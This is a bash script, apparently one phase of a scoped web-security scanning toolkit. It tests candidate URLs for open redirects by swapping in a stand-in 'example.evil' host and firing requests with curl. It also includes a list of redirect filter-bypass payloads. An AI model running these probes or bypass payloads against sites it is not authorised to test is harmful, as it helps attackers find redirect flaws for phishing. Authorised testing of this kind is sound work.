#!/usr/bin/env bash
# vuln/open-redirect.sh — open-redirect detection across gf-redirect candidates.

PHASE="open-redirect"
. "$(dirname "$0")/_lib.sh"
require_target
ensure_scope
OUTDIR=$(out_dir "$PHASE")

GF_REDIR="${GF_REDIR:-$RECONFORGE_OUTPUT_DIR/$TARGET/$DATESTAMP/11-pattern-filter/gf-redirect.txt}"
if [ ! -s "$GF_REDIR" ]; then
    log ERR "no redirect candidates at $GF_REDIR — run recon/11 first"
    exit 5
fi

EVIL="${EVIL_URL:-https://example.evil/}"

# 1. Plain payload replacement
if command -v qsreplace >/dev/null 2>&1; then
    cat "$GF_REDIR" | qsreplace "$EVIL" > "$OUTDIR/payload-urls.txt"
else
    sed 's/=[^&]*/='"${EVIL//\//\\/}"'/g' "$GF_REDIR" > "$OUTDIR/payload-urls.txt"
fi

# 2. Fire each and check the Location header for our evil host
log INFO "firing $(wc -l < "$OUTDIR/payload-urls.txt") candidates"
: > "$OUTDIR/confirmed.txt"
while read -r u; do
    loc=$(curl -sI --max-time 8 -o /dev/null -w '%{redirect_url}\n%{http_code}' "$u" 2>/dev/null \
        | head -1)
    if echo "$loc" | grep -qE "^https?://example\.evil"; then
        echo "$u → $loc" >> "$OUTDIR/confirmed.txt"
        log INFO "OPEN REDIRECT: $u → $loc"
    fi
done < "$OUTDIR/payload-urls.txt"

# 3. Common bypass payloads (the XSSRat 00x10-01 chapter list)
log INFO "running known-bypass payload set"
BYPASS_PAYLOADS=(
    "//example.evil"
    "/\\\\example.evil"
    "//google.com@example.evil"
    "https:example.evil"
    "/%2f%2fexample.evil"
    "https://target.com.example.evil"
)
: > "$OUTDIR/bypass-tests.txt"
# Test just the FIRST 10 candidate base URLs with each bypass form
head -10 "$GF_REDIR" | while read -r u; do
    for p in "${BYPASS_PAYLOADS[@]}"; do
        forged=$(echo "$u" | sed "s|=[^&]*|=$p|")
        loc=$(curl -sI --max-time 6 -o /dev/null -w '%{redirect_url}' "$forged" 2>/dev/null || echo "")
        if echo "$loc" | grep -qE "example\.evil"; then
            echo "BYPASS $p succeeds: $forged → $loc" >> "$OUTDIR/bypass-tests.txt"
            log INFO "BYPASS HIT ($p): $forged"
        fi
    done
done

log INFO "open-redirect done — confirmed=$(wc -l < "$OUTDIR/confirmed.txt") bypasses=$(wc -l < "$OUTDIR/bypass-tests.txt")"
